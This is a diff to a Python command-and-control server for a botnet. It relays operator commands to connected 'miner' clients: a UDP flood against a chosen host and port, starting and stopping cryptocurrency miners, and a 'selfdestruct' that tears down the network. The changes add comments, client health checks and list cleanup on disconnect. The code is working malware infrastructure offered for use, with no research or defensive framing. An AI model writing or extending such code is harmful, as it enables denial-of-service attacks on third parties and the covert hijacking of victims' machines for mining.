@@ -16,10 +16,11 @@ def init_server():
 
 
 def handle_manager(conn, addr, server):
+    #handle controller connection
     global address_book
     connected = True
     manager = conn
-    print(f'[CONNECTION] Client {addr[0]} connected')
+    print(f'[CONNECTION] Controller {addr[0]} connected')
     while connected:
                 #command loop
                 command = conn.recv(1024).decode('utf-8')
@@ -69,26 +70,26 @@ def handle_manager(conn, addr, server):
                         client.start_ping(hostname, port)
                     
                     conn.send(f'[NOTICE] UDP flooding {hostname} on port {port}'.encode('utf-8'))
-
+                #stop ddos
                 elif command == 'noping':
                     for i, client in enumerate(client_objects):
                         client.stop_ping()
                         print('[NOTICE] UDP Flood stopped...')
-                          
+                #start mining   
                 elif command =='startmine':
                     print('[NOTICE] Starting Miners')
                     for i, client in enumerate(client_objects):
                         client.start_mine()
                     print(f'[NOTICE] {len(client_objects)} miners started')
                     conn.send(f'{len(client_objects)} miners started'.encode('utf-8'))
-                    
+                #stop mining 
                 elif command =='stopmine':
                     print('[NOTICE] Stopping Miners')
                     for i, client in enumerate(client_objects):
                         client.stop_mine()
                     print(f'[NOTICE] {len(client_objects)} miners stopped')
                     conn.send(f'{len(client_objects)} miners stopped'.encode('utf-8'))
-                    
+                #destroy network
                 elif command =='selfdestruct':
                     print(f'[ALERT!!!] Destroying {len(client_objects)} Miners')
                     for i, client in enumerate(client_objects):
@@ -103,6 +104,7 @@ def handle_manager(conn, addr, server):
             
 
 def handle_client(conn, addr, server):
+    #handle miner connection
     try:
         connected = True
         client = Client(conn, addr, server)
@@ -111,16 +113,21 @@ def handle_client(conn, addr, server):
         index = len(current_clients) - 1
         while connected:
             #print(f'Client {index + 1}')
-            time.sleep(5)
+            #check if the client is still connected
+            client.checkup()
+            time.sleep(10)
+    except:
+            print(f'\n[NOTICE] Connection with {addr[0]} closed')
+            current_clients.remove(client)
+            client_objects.remove(client)
             
                    
-    except:
-        print(f'\n[NOTICE] Connection with {addr[0]} closed')
-        current_clients.remove(client)
+    
             
             
     
 def main(server):
+    #handle all connections with the controller and clients
     global address_book
     server.listen()
     print(f'[INFO] Listening on {ADDR[0]}:{ADDR[1]}\n')
@@ -137,7 +144,7 @@ def main(server):
             elif managecheck.decode('utf-8') == 'client':
                 address_book.append(addr)
                 t1 = threading.Thread(target=handle_client, args=(conn, addr, server))
-                t1.start()
+                t1.start() 
                 managecheck = None
         
             print(f'\n[ACTIVE] Miners: {len(client_objects)}\n')
